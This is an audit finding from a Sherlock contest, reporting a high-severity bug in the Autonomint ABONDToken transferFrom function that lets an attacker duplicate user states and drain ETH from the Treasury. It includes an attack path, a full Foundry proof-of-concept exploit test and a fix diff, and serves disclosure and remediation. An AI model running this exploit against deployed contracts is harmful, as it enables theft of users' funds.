---
tags:
  - lang/solidity
  - sector/lending
  - sector/stable
  - sector/token
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
protocol: "[[Autonomint Colored Dollar V1]]"
auditors:
  - "[[tjonair]]"
report: "https://github.com/sherlock-audit/2024-11-autonomint-judging"
genome:
  - "[[missing-modifier]]"
  - "[[direct-drain]]"
  - "[[liquidation-underwater]]"
  - "[[reentrancy-guard]]"
  - "[[timestamp-dependence]]"
---
# H-9: `ABONDToken::transferFrom` does not work as intended and allows theft of ETH funds from `Treasury`

- id: 45462
- impact: HIGH
- protocol: [[Autonomint Colored Dollar V1]]
- reporter: tjonair (Sherlock)
- source: N/A

## Summary


This report discusses a bug found in the ABONDToken contract, which is used to manage the ABOND token. This bug allows for the theft of ETH funds from the Treasury contract. The bug was found by multiple individuals and can be triggered by an attacker who has approved access to another user's ABOND tokens. The root cause of the bug is a logical issue in the transferFrom function, where the fromState post Colors::_debit is updated to the msg.sender instead of the from address. This not only breaks the accounting of the token but also allows an attacker to drain ETH funds from the Treasury contract through the Borrowing::redeemYields function. The impact of this bug includes breaking the accounting of the token, non-compliance with EIP-20, and theft of ETH funds. A proof of concept has been provided to demonstrate the bug.

## Details

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/636 

## Found by 
0xAadi, 0xAristos, KungFuPanda, PNS, Waydou, durov, montecristo, santiellena, theweb3mechanic, tjonair, valuevalk

### Summary

The `ABONDToken::transferFrom` function suffers from a logical issue where the `fromState` post `Colors::_debit` is updated to the `msg.sender` and not to the `from` address. This not only breaks the accounting of the `ABONDToken` and the expected functionality of an `ERC20` token but also allows an attacker to drain ETH `Treasury` funds through the `Borrowing::redeemYields` function.

### Root Cause

In the `ABONDToken::transferFrom` function, after the `fromState` of the `from` address gets debited, it is assigned to the `msg.sender` state:
[Abond_Token.sol#L147-L170](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Token/Abond_Token.sol#L147-L170)
```solidity
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public override returns (bool) {
        // check the input params are non zero
        require(from != address(0) && to != address(0), "Invalid User");
        
        // get the sender and receiver state
        State memory fromState = userStates[from];
        State memory toState = userStates[to];
        
        // update receiver state
        toState = Colors._credit(fromState, toState, uint128(value));
        userStates[to] = toState;
        
        // update sender state
        fromState = Colors._debit(fromState, uint128(value));
        userStates[msg.sender] = fromState;
        
        // transfer abond
        super.transferFrom(from, to, value);
        return true;
    }
```

This creates a problem when making a valid call to `transferFrom`. When somebody (or a protocol) wants to transfer from a user the approved `ABOND` to use it, the `ERC20` balance it will get will be the expected, however, the `userState` of the `msg.sender` will be the state of the `from` address right after it got the `value` amount debited in `Colors::_debit`.

Additionally, an attacker could use it to duplicate `userStates` to call `Borrowing::redeemYields` with an inflated `ethBacked` amount and a lower `cumulativeRate` that couldn't get in a valid way.

See the `Borrowing::redeemYields` flow and how the `userState` information is used to calculate how much ETH will be redeemed:
[borrowing.sol#L318-L333](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L318-L333)
```solidity
    function redeemYields(
        address user,
        uint128 aBondAmount
    ) public returns (uint256) {
        // Call redeemYields function in Borrow Library
        return (
            BorrowLib.redeemYields(
                user,
                aBondAmount,
                address(usda),
                address(abond),
                address(treasury),
                address(this)
            )
        );
    }
```

The `Treasury::withdrawFromExternalProtocol` function has an external call to the `user` address to send the ETH calculated in `Treasury::withdrawFromIonicByUser`:
[Treasury.sol#L283-L296](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L283-L296)
```solidity
    function withdrawFromExternalProtocol(
        address user,
        uint128 aBondAmount
    ) external onlyCoreContracts returns (uint256) {
        if (user == address(0)) revert Treasury_ZeroAddress();
        
        // Withdraw from external protocols
        uint256 redeemAmount = withdrawFromIonicByUser(user, aBondAmount);
        // Send the ETH to user
        (bool sent, ) = payable(user).call{value: redeemAmount}(""); // EXTERNAL CALL
        // check the transfer is successfull or not
        require(sent, "Failed to send Ether");
        return redeemAmount;
    }
```

Here it can be seen that the `amount` to be withdrawn is calculated using `ABONDToken::userStates` information:
[Treasury.sol#L703-L724](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L703-L724)
```solidity
    function withdrawFromIonicByUser(
        address user,
        uint128 aBondAmount
    ) internal nonReentrant returns (uint256) {
        uint256 currentExchangeRate = ionic.exchangeRateCurrent();
        uint256 currentCumulativeRate = _calculateCumulativeRate(currentExchangeRate, Protocol.Ionic);
        
        State memory userState = abond.userStates(user); // @audit user states data
        uint128 depositedAmount = (aBondAmount * userState.ethBacked) / PRECISION;
        uint256 normalizedAmount = (depositedAmount * CUMULATIVE_PRECISION) / userState.cumulativeRate;
        
        //withdraw amount
        uint256 amount = (currentCumulativeRate * normalizedAmount) / CUMULATIVE_PRECISION;
        // withdraw from ionic
        ionic.redeemUnderlying(amount);
        
        protocolDeposit[Protocol.Ionic].totalCreditedTokens = ionic.balanceOf(address(this));
        protocolDeposit[Protocol.Ionic].exchangeRate = currentExchangeRate;
        // convert weth to eth
        WETH.withdraw(amount);
        return amount;
    }
```

It is needed that the `aBondAmount` parameter passed in `Borrowing::redeemYields` is at most the amount that `ABONDToken::balanceOf` returns and not the `abondBalance` in `ABONDToken::userStates` because when burning both amounts will face deductions (When debiting the user state and when the `ERC20` `burnFrom` function is called).

### Internal pre-conditions

For the logical issue: none.

For the theft of ETH from `Treasury`:
- One account that holds a big amount of `ABOND` (N°1)
- Other account that has less `ABOND` (N°2).

### External pre-conditions

Noen

### Attack Path

- Attacker approves account 2 to spend some amount of account 1.
- Attacker transfers a small amount of `ABOND` from account 1, to account 3 calling `transferFrom` with account 2.
- Now that the `userState` of account 1 is duplicated in account 2, the attacker calls `Borrowing::redeemYields` with the account 2 with the `aBondAmount` parameter as the balance of account 2, but when withdrawing from the external protocol, it will use the duplicate `userState` of account 2 which now is a quasi-duplicated of `userState` of account. In addition, the `userState` of account 1 will not debit the `value` amount and the attacker will be able to call `Borrowing::redeemYields` with the two accounts to withdraw twice as much as expected.

### Impact

- Breaking of accounting in `ABONDToken` `userStates`.
- Non-compliance with EIP-20.
- Theft of ETH funds from `Treasury`

### PoC

Add the following PoC to `test/foundry/Borrowing.t.sol`:

```solidity
function test_PoC_TransferFromBroken() public {
        uint256 ETH = 1;
        uint24 ethPrice = 388345;
        uint8 strikePricePercent = uint8(IOptions.StrikePrice.FIVE);
        uint64 strikePrice = uint64(ethPrice + (ethPrice * ((strikePricePercent * 5) + 5)) / 100);
        uint256 amount = 10 ether;

        address USER_2 = makeAddr("USER_2");

        uint128 usdtToDeposit = uint128(contractsB.cds.usdtLimit());
        uint256 liquidationAmount = usdtToDeposit / 2;

        // deposit in CDS so there is back funds for the USDa
        address cdsDepositor = makeAddr("depositor");

        {
            vm.startPrank(cdsDepositor);

            contractsB.usdt.mint(cdsDepositor, usdtToDeposit);
            contractsB.usdt.approve(address(contractsB.cds), usdtToDeposit);
            vm.deal(cdsDepositor, globalFee.nativeFee);
            contractsB.cds.deposit{value: globalFee.nativeFee}(
                usdtToDeposit, 0, true, uint128(liquidationAmount), 150000
            );

            vm.stopPrank();
        }

        {
            vm.startPrank(USER_2);
            vm.deal(USER_2, globalFee.nativeFee + amount);
            contractsB.borrow.depositTokens{value: globalFee.nativeFee + amount}(
                ethPrice,
                uint64(block.timestamp),
                IBorrowing.BorrowDepositParams(
                    IOptions.StrikePrice.FIVE, strikePrice, ETH_VOLATILITY, IBorrowing.AssetName(ETH), amount
                )
            );

            vm.stopPrank();
        }

        {
            vm.startPrank(USER);

            vm.deal(USER, globalFee.nativeFee + (amount / 2));
            contractsB.borrow.depositTokens{value: globalFee.nativeFee + (amount / 2)}(
                ethPrice,
                uint64(block.timestamp),
                IBorrowing.BorrowDepositParams(
                    IOptions.StrikePrice.FIVE, strikePrice, ETH_VOLATILITY, IBorrowing.AssetName(ETH), amount / 2
                )
            );

            vm.stopPrank();
        }

        vm.warp(block.timestamp + 12960);
        vm.roll(block.number + 1080);

        address account1 = makeAddr("account1");
        address account2 = makeAddr("account2");
        address account3 = makeAddr("account3");

        {
            vm.startPrank(USER);

            uint64 index = 1;

            Treasury.GetBorrowingResult memory getBorrowingResult = contractsB.treasury.getBorrowing(USER, index);
            Treasury.DepositDetails memory depositDetail = getBorrowingResult.depositDetails;

            uint256 currentCumulativeRate = contractsB.borrow.calculateCumulativeRate();
            contractsB.usda.mint(USER, 1 ether); // @audit so there are enough funds (doesn't affect the PoC)
            uint256 tokenBalance = contractsB.usda.balanceOf(USER);

            if ((currentCumulativeRate * depositDetail.normalizedAmount) / 1e27 > tokenBalance) {
                return;
            }

            contractsB.usda.approve(address(contractsB.borrow), tokenBalance);
            vm.deal(USER, globalFee.nativeFee);
            contractsB.borrow.withDraw{value: globalFee.nativeFee}(
                USER, index, "0x", "0x", ethPrice, uint64(block.timestamp)
            );

            contractsB.abond.transfer(account2, contractsB.abond.balanceOf(USER));

            vm.stopPrank();
        }

        {
            vm.startPrank(USER_2);

            uint64 index = 1;

            Treasury.GetBorrowingResult memory getBorrowingResult = contractsB.treasury.getBorrowing(USER_2, index);
            Treasury.DepositDetails memory depositDetail = getBorrowingResult.depositDetails;

            uint256 currentCumulativeRate = contractsB.borrow.calculateCumulativeRate();
            contractsB.usda.mint(USER_2, 1 ether); // @audit so there are enough funds (doesn't affect the PoC)
            uint256 tokenBalance = contractsB.usda.balanceOf(USER_2);

            if ((currentCumulativeRate * depositDetail.normalizedAmount) / 1e27 > tokenBalance) {
                return;
            }

            contractsB.usda.approve(address(contractsB.borrow), tokenBalance);
            vm.deal(USER_2, globalFee.nativeFee);
            contractsB.borrow.withDraw{value: globalFee.nativeFee}(
                USER_2, index, "0x", "0x", ethPrice - 15000, uint64(block.timestamp)
            );

            // see the "Internal pre-conditions" section to see that matches the following
            contractsB.abond.transfer(account1, contractsB.abond.balanceOf(USER_2));

            vm.stopPrank();
        }

        { // needed so there is something to steal, this proves the issue
            vm.startPrank(USER);

            vm.deal(USER, globalFee.nativeFee + (amount / 2));
            contractsB.borrow.depositTokens{value: globalFee.nativeFee + (amount / 2)}(
                ethPrice,
                uint64(block.timestamp),
                IBorrowing.BorrowDepositParams(
                    IOptions.StrikePrice.FIVE, strikePrice, ETH_VOLATILITY, IBorrowing.AssetName(ETH), amount / 2
                )
            );

            vm.stopPrank();
        }

        {
            // here the attack starts
            (, uint128 ethBacked1Before,) = contractsB.abond.userStates(account1);
            (, uint128 ethBacked2Before,) = contractsB.abond.userStates(account2);

            assert(ethBacked1Before > ethBacked2Before);

            uint256 acount2AbondBalance = contractsB.abond.balanceOf(account2);
            uint256 acount1AbondBalance = contractsB.abond.balanceOf(account1);

            // check how much eth it would get in case attack is not performed
            (, uint256 redeemableAmountBefore2,) =
                contractsB.borrow.getAbondYields(account2, uint128(acount2AbondBalance));
            (, uint256 redeemableAmountBefore1,) =
                contractsB.borrow.getAbondYields(account1, uint128(acount1AbondBalance - 1));

            // step 1 from "Attack path" section
            vm.prank(account1);
            contractsB.abond.approve(account2, 1);

            // step 2 from "Attack path" section
            vm.prank(account2);
            contractsB.abond.transferFrom(account1, account3, 1);

            (, uint128 ethBacked1After,) = contractsB.abond.userStates(account1);
            (, uint128 ethBacked2After,) = contractsB.abond.userStates(account2);

            assertEq(ethBacked1Before, ethBacked1After);
            assert(ethBacked2Before < ethBacked2After);

            // step 3 from "Attack path" section
            vm.startPrank(account2);
            contractsB.abond.approve(address(contractsB.borrow), type(uint256).max);
            uint256 withdrawedAmount2 = contractsB.borrow.redeemYields(account2, uint128(acount2AbondBalance));
            vm.stopPrank();

            // "Impact" section, point 3
            assert(withdrawedAmount2 > redeemableAmountBefore2);

            vm.startPrank(account1);
            contractsB.abond.approve(address(contractsB.borrow), type(uint256).max);
            uint256 withdrawedAmount1 = contractsB.borrow.redeemYields(account1, uint128(acount1AbondBalance - 1));
            vm.stopPrank();

            // "Impact" section, point 3
            assertEq(withdrawedAmount1, redeemableAmountBefore1);
        }
    }
```

To run the test:
```bash
forge test --fork-url https://mainnet.mode.network/ --mt test_PoC_TransferFromBroken -vvv
```

### Mitigation

Update the `userState` of `from` and not of `msg.sender` in [`ABONDToken::transferFrom`](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Token/Abond_Token.sol#L147-L170):
```diff
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public override returns (bool) {
        // check the input params are non zero
        require(from != address(0) && to != address(0), "Invalid User");
        
        // get the sender and receiver state
        State memory fromState = userStates[from];
        State memory toState = userStates[to];
        
        // update receiver state
        toState = Colors._credit(fromState, toState, uint128(value));
        userStates[to] = toState;
        
        // update sender state
        fromState = Colors._debit(fromState, uint128(value));
-       userStates[msg.sender] = fromState;
+       userStates[from] = fromState;
        
        // transfer abond
        super.transferFrom(from, to, value);
        return true;
    }
```
